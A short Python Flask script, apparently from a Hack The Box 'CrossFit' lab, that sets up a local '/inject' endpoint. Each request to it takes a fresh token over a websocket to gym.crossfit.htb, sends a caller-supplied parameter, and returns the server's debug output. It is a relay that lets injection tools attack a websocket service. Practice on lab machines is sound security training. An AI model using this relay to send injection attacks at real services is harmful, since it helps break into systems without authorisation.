from flask import Flask
from flask import request
import json
from websocket import create_connection

app = Flask(__name__)


@app.route('/inject')
def index():
    ws = create_connection("ws://gym.crossfit.htb/ws")
    result =  ws.recv()
    token=json.loads(result)['token']
    param=request.args.get('param')
    current_json=json.loads('{"message":"available","params":"1","token":"be8fa1cae3cd4a2b5c9ed815d4b151392e23fadc9ea1c9a44cf5534a7f582415"}')
    current_json['params']=param
    current_json['token']=token
    ws.send(json.dumps(current_json))
    result = json.loads(ws.recv())
    print (result['debug'])
    token=result['token']

    return result

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')